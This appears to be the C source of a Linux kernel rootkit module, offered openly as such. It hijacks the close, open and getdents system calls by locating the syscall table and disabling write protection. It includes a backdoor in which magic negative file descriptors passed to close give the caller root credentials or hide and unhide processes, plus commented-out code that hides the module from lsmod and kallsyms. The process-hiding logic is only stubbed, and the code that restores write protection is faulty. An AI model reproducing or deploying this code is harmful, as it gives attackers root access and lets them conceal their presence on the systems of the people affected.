#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/limits.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/spinlock.h>
#include <linux/list.h>
#include <asm/unistd.h>

#if defined(__386__)
#define SYSCALL_TABLE_START 0xc0000000
#define SYSCALL_TABLE_STOP 0xd0000000
typedef unsigned int pointer_size_t;
#else
#define SYSCALL_TABLE_START (unsigned long) 0xffffffff81000000l
#define SYSCALL_TABLE_STOP (unsigned long) 0xffffffffa2000000l
typedef unsigned long pointer_size_t;
#endif

#define BUFSIZE 32768

struct linux_dirent {
    unsigned long       d_ino;
    unsigned long       d_off;
    unsigned short      d_reclen;
    char                name[1];
};

struct hidden_pids_struct {
    pid_t pid;
    struct list_head list;
};

struct buffer_struct {
    void *buf;
    spinlock_t lock;
};

struct buffer_struct buf_struct;

struct hidden_pids_struct hidden_pids;


/* pid of the process that has currently opened '/proc/' */
pid_t proc_open_pid;

/* fd for opened '/proc/' in this process open_files table */
int proc_open_fd;


/***************************************************************************/
/* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
#define ELEVATE_UID -23121990
#define HIDE_PROCESS -19091992
#define SHOW_PROCESS -2051967


/***************************************************************************/


unsigned long **syscall_table;

asmlinkage int (*original_close)(int fd);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*original_open)(const char __user *pathname, int flags, int mode);

int elevate_current_privileges(void)
{
    int err = -1;

    struct cred *elevated_cred = prepare_creds();
    kuid_t elevated_uid;
    kgid_t elevated_gid;
    elevated_uid.val = 0;
    elevated_gid.val = 0;

    if (elevated_cred != NULL) {
        elevated_cred->uid = elevated_cred->euid = elevated_cred->suid
             = elevated_cred->fsuid = elevated_uid;
        elevated_cred->gid = elevated_cred->egid = elevated_cred->sgid
             = elevated_cred->fsgid = elevated_gid;

        commit_creds(elevated_cred);
        err = 0;
    }

    return err;
}

void init_hidden_pids_list(void)
{
    INIT_LIST_HEAD(&hidden_pids.list);
}

int is_in_hidden_pids(pid_t pid)
{
    struct hidden_pids_struct *iter;
    list_for_each_entry(iter, &hidden_pids.list, list) {
        if (iter->pid == pid)
            return 1;
    }
    return 0;
}

/* Remove this process's pid from our hidden pids list */
int show_current_process(void)
{
    struct hidden_pids_struct *iter, *tmp;
    pid_t pid = current->pid;
    list_for_each_entry_safe(iter, tmp, &hidden_pids.list, list) {
        if (iter->pid == pid) {
            list_del(&iter->list);
            kfree(iter);
            return 0;
        }
    }
    return -1;
}

/* Add this process's pid to our hidden pids list */
int hide_current_process(void)
{
    int err = 0;
    struct hidden_pids_struct *node;
    pid_t pid = current->pid;

    node = (struct hidden_pids_struct *)
            kmalloc(sizeof(struct hidden_pids_struct), GFP_KERNEL);
    if (node == NULL) {
        err = -1;
        goto out;
    }

    node->pid = pid;
    list_add_tail(&node->list, &hidden_pids.list);
out:
    return err;
}


char *get_str_in_kernelspace(const char __user *ustr, char *kstr, int max)
{
    size_t len = strnlen_user(ustr, max); // including null termiantor
    if (len > max)
        return NULL;
    strncpy_from_user(kstr, ustr, len);
    return kstr;
}


/* Is the string ustr "/proc"? */
int is_proc(const char __user *ustr)
{
    int ret = 0;
    char *kpathname;

    spin_lock(&(buf_struct.lock));
    kpathname = get_str_in_kernelspace(ustr, buf_struct.buf, PATH_MAX);
    if (kpathname == NULL)
        goto out;
    if (strcmp("/proc", kpathname) == 0)
        ret = 1;
out:
    spin_unlock(&(buf_struct.lock));
    return ret;
}

asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
    mm_segment_t old_fs;
    struct linux_dirent *dir;
    int ret;
    void *kbuf;
    unsigned long kbuf_offset, ubuf_offset;
    kbuf_offset = ubuf_offset = 0;
    kbuf = buf_struct.buf;

    old_fs = get_fs();
    ret = original_getdents(fd, (struct linux_dirent *) kbuf, BUFSIZE);
    set_fs(old_fs);

    if (ret < 0)
        goto out;

    dir = (struct linux_dirent *) kbuf;
    for (kbuf_offset = 0; kbuf_offset < ret; kbuf_offset += dir->d_reclen) {
        dir = (struct linux_dirent *) (kbuf + kbuf_offset);

        if (proc_open_fd == fd && proc_open_pid == current->pid) {
            /* this means we are calling getdents on "/proc/"
               we have to hide the pids in our list */
        }
        else {
            /* also check for special prefixes or suffixes
               and hide those files as well  */
        }
    }
out:
    return ret;
}

asmlinkage int my_open(const char __user *pathname, int flags, int mode)
{
    int fd;
    fd = original_open(pathname, flags, mode);
    
    if (is_proc(pathname)) {
        /* opened "/proc";
           store the process's pid and opened fd
           we'll use these in getdents to hide processes */

        proc_open_pid = current->pid;
        proc_open_fd = fd;
    }

    return fd;
}

asmlinkage int my_close(int fd)
{
    int err = 0;

    if (fd < 0) {
        switch (fd) {
        case ELEVATE_UID:
            elevate_current_privileges();
            break;
        case HIDE_PROCESS:
            hide_current_process();
            break;
        case SHOW_PROCESS:
            show_current_process();
            break;
        }
    }
    else {
        if (proc_open_fd == fd && proc_open_pid == current->pid) {
            /* closed "/proc"; 
               clear stored fd and pid */

            proc_open_fd = -1;
            proc_open_pid = -1;
        }
        err = original_close(fd);
    }

    return err;
}

pointer_size_t **find_syscall_table(void)
{
    pointer_size_t i;
    pointer_size_t **table;
    for (i = SYSCALL_TABLE_START; i < SYSCALL_TABLE_STOP; i += sizeof(void *)) {
        table = (pointer_size_t **) i;
        if ( table[__NR_close] == (pointer_size_t *) sys_close)
            return &table[0];
    }
    return NULL;
}



void init_buf_struct(void)
{
    spin_lock_init(&(buf_struct.lock)); 
    buf_struct.buf = kmalloc(BUFSIZE, GFP_KERNEL);
}
void deinit_buf_struct(void)
{
    kfree(buf_struct.buf);
}

int rootkit_init(void)
{
    printk("Rootkit loaded\n");
    proc_open_fd = -1;
    proc_open_pid = -1;
    init_buf_struct();
    init_hidden_pids_list();

    /* Uncomment the following lines after completion of module 
     * Can't rmmod it if we have it uncommented during dev
     * That's just cumbersome during dev
     */
    
    /*
    // stop from showing on lsmod
    list_del_init(&__this_module.list);

    // stop showing in /proc/kallsyms
    kobject_del(&THIS_MODULE->mkobj.kobj);
    */
    
    syscall_table = find_syscall_table();
    if (!syscall_table) {
        goto out;    
    }
    
    printk("Syscall table at %p\n", syscall_table);

    
    // make writable by disabling write protect
    write_cr0(read_cr0() & (~0x10000));

    // hijack close system call
    original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
    syscall_table[__NR_close] = (void *) my_close;

    // hijack open system call
    original_open = (asmlinkage int (*)(const char *, int, int)) syscall_table[__NR_open];
    syscall_table[__NR_open] = (void *) my_open;

    // hijack getdents system call
    original_getdents = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int)) syscall_table[__NR_getdents];
    syscall_table[__NR_getdents] = (void *) my_getdents;

    // enable write protected
    write_cr0(read_cr0() & 0x10000);



    out:
    return 0;
}

void rootkit_exit(void)
{
    deinit_buf_struct();



    write_cr0(read_cr0() & (~0x10000));

    syscall_table[__NR_close] = (void *) original_close;
    syscall_table[__NR_open] = (void *) original_open;
    syscall_table[__NR_getdents] = (void *) original_getdents;

    write_cr0(read_cr0() & 0x10000);



    printk("Rootkit unloaded\n");
}


MODULE_LICENSE("GPL");
MODULE_AUTHOR("BufferOverflowers");
module_init(rootkit_init);
module_exit(rootkit_exit);
